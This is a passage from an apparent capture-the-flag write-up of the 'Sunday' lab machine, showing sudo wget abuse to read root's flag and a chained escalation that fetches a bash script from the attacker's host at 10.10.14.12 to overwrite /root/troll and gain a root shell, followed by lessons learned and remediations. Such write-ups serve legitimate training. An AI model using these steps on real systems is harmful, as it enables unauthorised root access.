<p><img alt="" src="../../img/Sunday Writeup wo Metasploit/1_sNjl25x8PcsO0dq8WhPS2Q.png" /></p>
<p>Let’s try to escalate to root privileges. Run the sudo command again to view the list of allowed commands the user can run as root.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sammy@sunday:~$ sudo -l
<span class="lineno" data-linenos="2 "></span>User sammy may run the following commands on this host:
<span class="lineno" data-linenos="3 "></span>    (root) NOPASSWD: /usr/bin/wget
</pre></div>

<p>We can run wget with root privileges! If you’re familiar with the “-i” flag in wget, you’ll know that we can use it to output the content of files. Therefore, we can run the following command to get the root flag.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sudo wget -i /root/root.txt
</pre></div>

<p>However, in this scenario we’re simply reading the content of the flag and not really escalating privileges. To get a root shell we need to chain the following two vulnerabilities:</p>
<ol>
<li>
<p>The user Sunny can execute the /root/troll file with root privileges, and</p>
</li>
<li>
<p>The user Sammy can overwrite any root owned file using the wget command.</p>
</li>
</ol>
<p>Therefore, we’ll use Sammy’s sudo privileges to overwrite the /root/troll file and include a shell in it. Then we’ll use Sunny’s sudo privileges to run the /root/troll file and convert our shell to a root shell.</p>
<p>Alright, let’s do this! In the attack machine, create a file called “troll” and add the following code to it.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>#!/usr/bin/bash
<span class="lineno" data-linenos="2 "></span>
<span class="lineno" data-linenos="3 "></span>bash
</pre></div>

<p>Then start up a simple Python server in the directory the file is in.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>python -m SimpleHTTPServer 5555
</pre></div>

<p>Go back the target machine running with the Sammy user privileges, and run the wget command to overwrite the /root/troll file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sudo wget -O /root/troll [http://10.10.14.12:5555/troll](http://10.10.14.12:5555/troll)
</pre></div>

<p>In another SSH session running with the Sunny user privileges, execute the troll file.</p>
<div class="highlight"><pre><span></span><span class="lineno" data-linenos="1 "></span>sudo /root/troll
</pre></div>

<p>Since we added a bash shell in the troll file and the troll file is being executed with root privilege, we get a root shell!</p>
<p><img alt="" src="../../img/Sunday Writeup wo Metasploit/1_uwgWwKXkC3A9TvuG3_UMiw.png" /></p>
<p><strong>Note:</strong> Something on the server seems to be resetting the /root/troll file every couple of seconds, therefore you only have small window of time between overwriting the troll file as Sammy and executing the troll file as Sunny.</p>
<h1 id="lessons-learned">Lessons Learned</h1>
<p>To gain an initial foothold on the box we exploited two vulnerabilities.</p>
<ol>
<li>
<p>Username enumeration of the finger service. The finger protocol is used to get information about users on a remote system. In our case, we used it to enumerate usernames that we later used to SSH into the server. The remediation for this vulnerability would be to disable this service.</p>
</li>
<li>
<p>Weak authentication credentials. After getting a username from the finger service, we ran a brute force attack on SSH to obtain a user’s credentials. The user should have used a sufficiently long password that is not easily crackable.</p>
</li>
</ol>
<p>To escalate privileges we exploited three vulnerabilities.</p>
<ol>
<li>
<p>Information disclosure. As a non privileged user, we had access to a backup of the shadow file that leaked hashed passwords. Any file that contains sensitive information should not be available to non privileged users.</p>
</li>
<li>
<p>Weak authentication credentials. Although the passwords were hashed in the backup shadow file, we were able to obtain the plaintext passwords by running john on the hashes. Again, the users should have used sufficiently long passwords that are not easily crackable.</p>
</li>
<li>
<p>Security Misconfigurations. Both Sammy and Sunny were configured to run commands as root. Chaining these two commands together allowed us to escalate our privileges to root. The administrators should have conformed to the concept of least privilege when configuring these users’ accounts.</p>
</li>
</ol>
<h1 id="conclusion">Conclusion</h1>
<p>22 machines down, 25 more to go!</p>
<p><img alt="" src="../../img/Sunday Writeup wo Metasploit/1_sJ0uFGl8yfWFVIOkND7IxQ.png" /></p>
                
                  
                
                
              
              
                


              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../Sense Writeup wo Metasploit/" title="26. Sense Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Previous
                </span>
                26. Sense Writeup w/o Metasploit.md
              </span>
            </div>
          </a>
        
        
          <a href="../Solidstate Writeup wo Metasploit/" title="28. Solidstate Writeup w/o Metasploit.md" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  Next
                </span>
                28. Solidstate Writeup w/o Metasploit.md
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Built by <a href="http://github.com/rushic24">Rushi</a> &copy; 2020
          </div>
        
        powered by
        <a href="https://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
  <div class="md-footer-social">
    <link rel="stylesheet" href="../../assets/fonts/font-awesome.css">
    
      <a href="https://github.com/rushic24" class="md-footer-social__link fa fa-"></a>
    
      <a href="https://www.linkedin.com/in/rushichaudhari" class="md-footer-social__link fa fa-"></a>
    
      <a href="" class="md-footer-social__link fa fa-"></a>
    
  </div>

    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../assets/javascripts/application.808e90bb.js"></script>
      
      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
      
        <script src="../../js/katex.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/katex.min.js"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/katex@0.11.1/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>